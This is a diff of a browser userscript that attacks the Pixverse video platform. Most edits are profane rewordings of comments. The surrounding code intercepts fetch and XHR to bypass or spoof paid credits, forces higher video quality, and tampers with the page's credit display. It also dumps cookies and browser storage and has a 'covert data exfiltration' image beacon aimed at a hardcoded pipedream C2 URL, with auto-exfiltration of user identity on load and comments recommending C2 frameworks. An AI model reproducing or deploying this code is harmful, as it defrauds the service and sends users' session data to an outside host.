@@ -31,15 +31,15 @@
   let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
   let isInitialized = false; // Flag to ensure core overrides are run only once
 
-  // --- References to your custom overridden functions for self-healing ---
+  // --- References my custom overridden functions for self-healing ---
   let myCustomXhrOpen = null;
   let myCustomFetch = null;
 
-  // --- Operational Configuration (Dynamically loaded from GM_setValue via Control Panel) ---
+  // --- This is really not giving a fuck about stealth now. I see you Pixverse, do you see me?. (Dynamically loaded from GM_setValue via Control Panel) ---
   const config = {
     // Default settings. These will be loaded from storage if available.
     debugMode: false,          // Show console logs, debug UI, and toast notifications.
-    c2Enabled: false,          // Enable covert data exfiltration.
+    c2Enabled: false,          // Enable covert data exfiltration (checkout Mythic).
     c2Server: "https://eovz1i2e285q5i.m.pipedream.net", // Canonical C2 endpoint
     creditBypassType: 'none',  // 'none', 'prevent_deduct', 'spoof_response', 'dom_tamper'
     creditSpoofValue: 999999,  // Value for response/DOM spoofing
@@ -75,7 +75,7 @@
     creativeExtend: /\/creative_platform\/video\/extend/ // For duration/credit deduction modification
   };
 
-  // --- Debugging and Analysis Framework (In-Memory Buffers) ---
+  // --- Debugging and Analysis Framework (In-Memory Buffers) | Dump this shit out for recon later ---
   const _redTeamDebugLog = []; // In-memory buffer for raw console-like messages
   const _redTeamGoods = [];   // In-memory buffer for structured test results/API snapshots
 
@@ -158,10 +158,10 @@
   }
 
   /**
-   * Logs specific messages to the in-memory debug buffer and console.
-   * Only logs if `config.debugMode` is true.
+   * Logs specific messages to the in-memory debug buffer and console for recon later.
+   * Only logs if `config.debugMode` is true so set that shit on for recon.
    * @param {string} message - The main log message.
-   * @param {object} [data] - Optional structured data to log. This will also be pushed to _redTeamGoods if provided.
+   * @param {object} [data] - Optional structured data to make it pretty. Type _redTeamGoods in the console for report.
    */
   function writeToLogFile(message, data = null) {
     if (config.debugMode) {
@@ -201,8 +201,8 @@
   }
 
   /**
-   * Dumps current localStorage, sessionStorage, and document.cookie to the debug log.
-   * Only active if `config.debugMode` is true.
+   * Dumps current localStorage, sessionStorage, and document.cookie to the debug log for a snapshot.
+   * Only active if `config.debugMode` is true, again set that shit on for recon.
    * @param {string} context - A label for when the state was dumped.
    */
   function dumpBrowserState(context = "UNKNOWN") {
@@ -245,7 +245,7 @@
   }
 
   /**
-   * Analyzes collected `_redTeamGoods` (structured logs) to suggest potential credit-related keys.
+   * Try out some autmatic analysis of the collected `_redTeamGoods` to suggest potential credit-related keys.
    * This function is exposed globally as `window.analyzeCredits()` in DEBUG_MODE.
    */
   window.analyzeCredits = function() {
@@ -331,11 +331,11 @@
     });
 
     if (potentialKeys.size > 0) {
-      writeToLogFile("Found potential credit-related keys/patterns:", {
+      writeToLogFile("Recon found potential credit-related keys/patterns:", {
         summary: Array.from(potentialKeys),
         details: analysisResults
       });
-      console.log(`${DATA_LOG_PREFIX} --- Potential Credit Keys/Patterns ---`);
+      console.log(`${DATA_LOG_PREFIX} --- Recon Potential Credit Keys/Patterns ---`);
       potentialKeys.forEach(key => console.log(`${DATA_LOG_PREFIX} - ${key}`));
       console.log(`${DATA_LOG_PREFIX} See window.redTeamGoods for detailed analysis results.`);
     } else {
@@ -412,8 +412,8 @@
   }
 
   /**
-   * Exfiltrates data covertly using an image beacon.
-   * Only attempts if `config.c2Enabled` is true and `config.c2Server` is configured (not placeholder).
+   * Exfiltrates data covertly using an image beacon on your c2.
+   * Only works if `config.c2Enabled` is true and `config.c2Server` is configured with your c2 server (try adaptix or mythic).
    * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
    * @param {string} dataPayload - The actual data to exfiltrate.
    */
@@ -434,7 +434,7 @@
   //────── API MODIFICATION LOGIC ──────//
 
   /**
-   * Modifies the user credits response to spoof a high credit value.
+   * A few different methods to try and modify the user credits.
    * @param {object} data - The original response data.
    * @returns {object|null} - The modified data, or null if no spoofing is applied.
    */
@@ -553,7 +553,7 @@
   //────── NETWORK INTERCEPTION ──────//
 
   /**
-   * Core logic for modifying API requests based on configured bypasses.
+   * Core logic for modifying API requests based on configured bypasses (trial and error kids).
    * @param {string} url - The request URL.
    * @param {string} method - The request method.
    * @param {object} originalBodyParsed - The parsed request body object.
@@ -563,7 +563,7 @@
     let modifiedBody = safeDeepClone(originalBodyParsed);
     let bodyWasModified = false;
 
-    // --- Apply Quality Modification (from PixverseAlpha v2.3.3) ---
+    // --- Attempt to Apply Quality Modification (from PixverseAlpha v2.3.3) ---
     if (config.forceQuality !== 'none' && matchesEndpoint(url, "creativeVideo") && method === "POST" && modifiedBody?.quality) {
       if (modifiedBody.quality !== config.forceQuality) {
         log(`Modifying video quality to ${config.forceQuality} for`, url);
@@ -616,14 +616,14 @@
       let processedBody = body;
       let originalBodyParsed = null;
       let bodyWasModified = false;
-      let modifiedBody = null; // PATCH: Declare modifiedBody here to ensure it's always defined in this scope.
+      let modifiedBody = null; // FIXED THIS SHIT: Declare modifiedBody here to ensure it's always defined in this scope.
 
       if (body) {
         originalBodyParsed = parseBody(body);
         if (originalBodyParsed) {
           logApiResponse(url, originalBodyParsed, 'request_original');
           const result = processRequestBodyModifications(url, method, originalBodyParsed);
-          modifiedBody = result.modifiedBody; // PATCH: Assign to the already declared variable.
+          modifiedBody = result.modifiedBody; // FIXED THIS SHIT: Assign to the already declared variable.
           bodyWasModified = result.bodyWasModified;
 
           if (bodyWasModified) {
@@ -680,8 +680,8 @@
       const formData = new FormData();
       for (const key in obj) {
           if (obj.hasOwnProperty(key)) {
-              // Note: This won't reconstruct File objects from metadata
-              // For a true red team tool, a sophisticated hook for Blob/File construction would be needed.
+              // Note: This won't really reconstruct File objects from metadata
+              // TODO for a true redteam engagement: a sophisticated hook for Blob/File construction.
               formData.append(key, obj[key]);
           }
       }
@@ -701,14 +701,14 @@
       let body = init?.body;
       let originalBodyParsed = null;
       let bodyWasModified = false;
-      let modifiedBody = null; // PATCH: Declare modifiedBody here to ensure it's always defined in this scope.
+      let modifiedBody = null; // FIXED THIS SHIT: Declare modifiedBody here to ensure it's always defined in this scope.
 
       if (body) {
         originalBodyParsed = parseBody(body);
         if (originalBodyParsed) {
           logApiResponse(url, originalBodyParsed, 'request_original');
           const result = processRequestBodyModifications(url, method, originalBodyParsed);
-          modifiedBody = result.modifiedBody; // PATCH: Assign to the already declared variable.
+          modifiedBody = result.modifiedBody; // FIXED THIS SHIT: Assign to the already declared variable.
           bodyWasModified = result.bodyWasModified;
 
           if (bodyWasModified) {
@@ -800,7 +800,7 @@
   }
 
   /**
-   * Overrides context menu blocking mechanisms on the page to enable native download.
+   * Right click where the fuck you want to.
    */
   function overrideContextMenuBlockers() {
     const originalAddEventListener = EventTarget.prototype.addEventListener;
@@ -824,6 +824,7 @@
 
   /**
    * Actively watches and tampers with the DOM element displaying credits.
+   * Still trying to figure how to fix this or devise a better method.
    */
   let domTamperObserver = null;
   function setupDOMTampering() {
@@ -948,7 +949,7 @@
   }
 
   /**
-   * Creates and injects the control panel UI into the DOM.
+   * Creates and injects the control panel UI into the DOM (again stealth is out the window with this but it doesnt seem Pixverse gives a fuck.
    */
   async function createControlPanel() {
     const panelId = 'pv-control-panel';
@@ -1100,7 +1101,7 @@
       toggleBtn.textContent = isHidden ? '-' : '+';
     });
 
-    // Add drag functionality to the control panel
+    // Add drag functionality to the control panel (might as well make myself comfy).
     let isDragging = false;
     let offsetX, offsetY;
 
@@ -1136,7 +1137,7 @@
   }
 
   /**
-   * Injects CSS styles for the toast notification and the control panel.
+   * Injects CSS styles for the toast notification and the control panel.(why not)
    */
   function injectCoreStyles() {
     if (document.getElementById("pk-core-styles")) return;
@@ -1189,7 +1190,7 @@
     document.head.appendChild(style);
   }
 
-  // Inject CSS for the dedicated debug panel (Cyan/Green Theme)
+  // Inject CSS for the dedicated debug panel (Cyan is my favorite color) 
   function injectDebugCSS() {
     const styleId = "pv-debug-css";
     if (document.getElementById(styleId)) return;
@@ -1472,7 +1473,7 @@
       // Initial state of DOM tampering
       setupDOMTampering();
 
-      // Auto-exfiltrate data on initialization if configured
+      // Auto-exfiltrate data on initialization if c2 server is up
       if (config.c2Enabled && config.autoExfilAuth) {
           try {
               const userId = localStorage.getItem('pixverse_user_id');
